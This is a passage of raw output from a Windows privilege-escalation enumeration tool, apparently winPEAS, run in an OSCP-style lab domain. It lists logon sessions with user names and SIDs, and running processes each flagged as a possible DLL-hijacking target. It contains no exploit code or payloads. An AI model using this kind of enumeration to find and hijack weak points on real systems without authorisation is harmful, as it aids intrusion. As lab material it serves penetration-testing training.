    Domain:                       OSCP
    Authentication Package:       NTLM
    Start Time:                   
    User Name:                    r.andrews
    User Principal Name:          r.andrews@oscp.exam
    User SID:                     S-1-5-21-2481101513-2954867870-2660283483-1106

   =================================================================================================

    Method:                       LSA
    Logon Server:                 DC20
    Logon Server Dns Domain:      oscp.exam
    Logon Id:                     13526383
    Logon Time:                   2/22/2026 8:16:57 AM
    Logon Type:                   Network
    Start Time:                   
    Domain:                       OSCP
    Authentication Package:       NTLM
    Start Time:                   
    User Name:                    g.jarvis
    User Principal Name:          g.jarvis@oscp.exam
    User SID:                     S-1-5-21-2481101513-2954867870-2660283483-1105

   =================================================================================================

    Method:                       LSA
    Logon Server:                 DC20
    Logon Server Dns Domain:      oscp.exam
    Logon Id:                     12721110
    Logon Time:                   2/22/2026 7:43:45 AM
    Logon Type:                   Network
    Start Time:                   
    Domain:                       OSCP
    Authentication Package:       NTLM
    Start Time:                   
    User Name:                    g.jarvis
    User Principal Name:          g.jarvis@oscp.exam
    User SID:                     S-1-5-21-2481101513-2954867870-2660283483-1105

   =================================================================================================

    Method:                       LSA
    Logon Server:                 DC20
    Logon Server Dns Domain:      OSCP.EXAM
    Logon Id:                     2695985
    Logon Time:                   2/22/2026 3:03:11 AM
    Logon Type:                   RemoteInteractive
    Start Time:                   
    Domain:                       OSCP
    Authentication Package:       Kerberos
    Start Time:                   
    User Name:                    r.andrews
    User Principal Name:          r.andrews@OSCP.EXAM
    User SID:                     S-1-5-21-2481101513-2954867870-2660283483-1106

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     2660991
    Logon Time:                   2/22/2026 3:03:10 AM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       Window Manager
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    DWM-2
    User Principal Name:          
    User SID:                     S-1-5-90-0-2

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      oscp.exam
    Logon Id:                     2658018
    Logon Time:                   2/22/2026 3:03:10 AM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       Font Driver Host
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    UMFD-2
    User Principal Name:          WS26$@oscp.exam
    User SID:                     S-1-5-96-0-2

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     997
    Logon Time:                   11/11/2024 6:49:47 PM
    Logon Type:                   Service
    Start Time:                   
    Domain:                       NT AUTHORITY
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    LOCAL SERVICE
    User Principal Name:          
    User SID:                     S-1-5-19

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     81200
    Logon Time:                   11/11/2024 6:49:47 PM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       Window Manager
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    DWM-1
    User Principal Name:          
    User SID:                     S-1-5-90-0-1

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     996
    Logon Time:                   11/11/2024 6:49:47 PM
    Logon Type:                   Service
    Start Time:                   
    Domain:                       OSCP
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    WS26$
    User Principal Name:          
    User SID:                     S-1-5-20

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      oscp.exam
    Logon Id:                     49457
    Logon Time:                   11/11/2024 6:49:46 PM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       Font Driver Host
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    UMFD-0
    User Principal Name:          WS26$@oscp.exam
    User SID:                     S-1-5-96-0-0

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      oscp.exam
    Logon Id:                     49438
    Logon Time:                   11/11/2024 6:49:46 PM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       Font Driver Host
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    UMFD-1
    User Principal Name:          WS26$@oscp.exam
    User SID:                     S-1-5-96-0-1

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      oscp.exam
    Logon Id:                     999
    Logon Time:                   11/11/2024 6:49:46 PM
    Logon Type:                   0
    Start Time:                   
    Domain:                       OSCP
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    WS26$
    User Principal Name:          WS26$@oscp.exam
    User SID:                     S-1-5-18

   =================================================================================================



════════════════════════════════════╣ Processes Information ╠════════════════════════════════════

╔══════════╣ Interesting Processes -non Microsoft-
╚ Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes
    vmtoolsd(1292)[C:\Program Files\VMware\VMware Tools\vmtoolsd.exe] -- POwn: r.andrews
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Program Files\VMware\VMware Tools (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
   =================================================================================================

    svchost(2584)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s UserManager
   =================================================================================================

    svchost(2152)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -p -s FontCache
   =================================================================================================

    svchost(1288)[C:\Windows\system32\svchost.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted -p -s PolicyAgent
   =================================================================================================

    svchost(2144)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
   =================================================================================================

    VGAuthService(3004)[C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe] -- POwn: SYSTEM
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Program Files\VMware\VMware Tools\VMware VGAuth (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
   =================================================================================================

    rdpclip(6020)[C:\Windows\System32\rdpclip.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: rdpclip
   =================================================================================================

    msedgewebview2(5156)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=gpu-process --noerrdialogs --user-data-dir="C:\Users\Administrator\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1836 --field-trial-handle=1928,i,15664937513237927659,16349251277674059669,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:2
   =================================================================================================

    AggregatorHost(3000)[C:\Windows\System32\AggregatorHost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: AggregatorHost.exe
   =================================================================================================

    svchost(412)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k DcomLaunch -p -s LSM
   =================================================================================================

    svchost(2996)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
   =================================================================================================

    RuntimeBroker(8164)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    svchost(5788)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS
   =================================================================================================

    wsmprovhost(400)[C:\Windows\system32\wsmprovhost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\wsmprovhost.exe -Embedding
   =================================================================================================

    svchost(1692)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k UserProfileService -p -s ProfSvc
   =================================================================================================

    WindowsTerminal(9676)[C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.20.11781.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe] -- POwn: Administrator
    Command Line: "C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.20.11781.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe" -Embedding
   =================================================================================================

    svchost(2120)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k netsvcs
   =================================================================================================

    svchost(3412)[C:\Windows\System32\svchost.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k NetworkService -p -s WinRM
   =================================================================================================

    RuntimeBroker(9392)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    OneDrive(9012)[C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive\OneDrive.exe] -- POwn: r.andrews
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive (Administrators [Allow: AllAccess])
    Command Line:  /setautostart /background
   =================================================================================================

    msedgewebview2(2976)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --user-data-dir="C:\Users\Administrator\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --mojo-named-platform-channel-pipe=5592.10568.820477936670202326
   =================================================================================================

    svchost(5560)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -p -s CDPSvc
   =================================================================================================

    svchost(6852)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s lfsvc
   =================================================================================================

    svchost(9868)[C:\Windows\system32\svchost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k DevicesFlow -s DevicesFlowUserSvc
   =================================================================================================

    msedgewebview2(9004)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=renderer --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --js-flags="--harmony-weak-refs-with-cleanup-some --expose-gc" --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=1366500608 --mojo-platform-channel-handle=3220 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:1
   =================================================================================================

    svchost(2536)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k netsvcs -p -s ShellHWDetection
   =================================================================================================

    dwm(6652)[C:\Windows\system32\dwm.exe] -- POwn: DWM-2
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "dwm.exe"
   =================================================================================================

    svchost(1672)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s DisplayEnhancementService
   =================================================================================================

    ShellExperienceHost(10132)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
   =================================================================================================

    powershell(5980)[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: Administrator
    Permissions: Administrators [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking folder: C:\Windows\System32\WindowsPowerShell\v1.0 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
   =================================================================================================

    svchost(2100)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s AudioEndpointBuilder
   =================================================================================================

    svchost(2960)[C:\Windows\system32\svchost.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k NetworkService -p
   =================================================================================================

    StartMenuExperienceHost(8060)[C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
   =================================================================================================

    Widgets(5592)[C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_524.24900.130.0_x64__cw5n1h2txyewy\Dashboard\Widgets.exe] -- POwn: Administrator
    Command Line: "C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_524.24900.130.0_x64__cw5n1h2txyewy\Dashboard\Widgets.exe" -ServerName:Microsoft.Windows.DashboardServer
   =================================================================================================

    WmiPrvSE(5860)[C:\Windows\system32\wbem\wmiprvse.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32\wbem (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\wbem\wmiprvse.exe
   =================================================================================================

    StartMenuExperienceHost(5540)[C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
   =================================================================================================

    dllhost(8556)[C:\Windows\system32\DllHost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
   =================================================================================================

    svchost(1228)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s UmRdpService
   =================================================================================================

    MicrosoftEdgeUpdate(5968)[C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe] -- POwn: SYSTEM
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeUpdate (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c
   =================================================================================================

    powershell(4236)[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: r.andrews
    Permissions: Administrators [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking folder: C:\Windows\System32\WindowsPowerShell\v1.0 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
   =================================================================================================

    svchost(1648)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -p -s DispBrokerDesktopSvc
   =================================================================================================

    taskhostw(6388)[C:\Windows\system32\taskhostw.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================

    SearchIndexer(5172)[C:\Windows\system32\SearchIndexer.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\SearchIndexer.exe /Embedding
   =================================================================================================

    svchost(7248)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    svchost(1644)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k InvSvcGroup -p -s InventorySvc
   =================================================================================================

    dllhost(3792)[C:\Windows\system32\dllhost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
   =================================================================================================

    svchost(2496)[C:\Windows\system32\svchost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
   =================================================================================================

    svchost(1628)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -s CertPropSvc
   =================================================================================================

    msedgewebview2(10828)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=crashpad-handler --user-data-dir=C:\Users\Administrator\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\Users\Administrator\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\Crashpad --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=100.0.4896.75 "--annotation=exe=C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --annotation=plat=Win64 "--annotation=prod=Edge WebView2" --annotation=ver=100.0.1185.36 --initial-client-data=0x13c,0x140,0x144,0x118,0x1e0,0x7ff8f749d840,0x7ff8f749d850,0x7ff8f749d860
   =================================================================================================

    svchost(1620)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -p -s SstpSvc
   =================================================================================================

    svchost(8084)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -p -s NPSMSvc
   =================================================================================================

    ShellExperienceHost(8944)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
   =================================================================================================

    dllhost(9804)[C:\Windows\system32\DllHost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
   =================================================================================================

    svchost(7288)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k UdkSvcGroup -s UdkUserSvc
   =================================================================================================

    lsass(748)[C:\Windows\system32\lsass.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\lsass.exe
   =================================================================================================

    SearchHost(7784)[C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" -ServerName:CortanaUI.AppXstmwaab17q5s3y22tp6apqz7a45vwv65.mca
   =================================================================================================

    svchost(1608)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s Dhcp
   =================================================================================================

    svchost(7640)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
   =================================================================================================

    conhost(6776)[C:\Windows\system32\conhost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    svchost(2032)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
   =================================================================================================

    svchost(1600)[C:\Windows\System32\svchost.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k netprofm -p -s netprofm
   =================================================================================================

    msedgewebview2(3752)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --mojo-named-platform-channel-pipe=3404.6896.6822827938938489019
   =================================================================================================

    svchost(1164)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s NcbService
   =================================================================================================

    svchost(9352)[C:\Windows\system32\svchost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k UdkSvcGroup -s UdkUserSvc
   =================================================================================================

    LogonUI(8920)[C:\Windows\system32\LogonUI.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "LogonUI.exe" /flags:0x0 /state0:0xa3216055 /state1:0x41c64e6d
   =================================================================================================

    sihost(1588)[C:\Windows\system32\sihost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: sihost.exe
   =================================================================================================

    SearchHost(8052)[C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" -ServerName:CortanaUI.AppXstmwaab17q5s3y22tp6apqz7a45vwv65.mca
   =================================================================================================

    msedgewebview2(4172)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
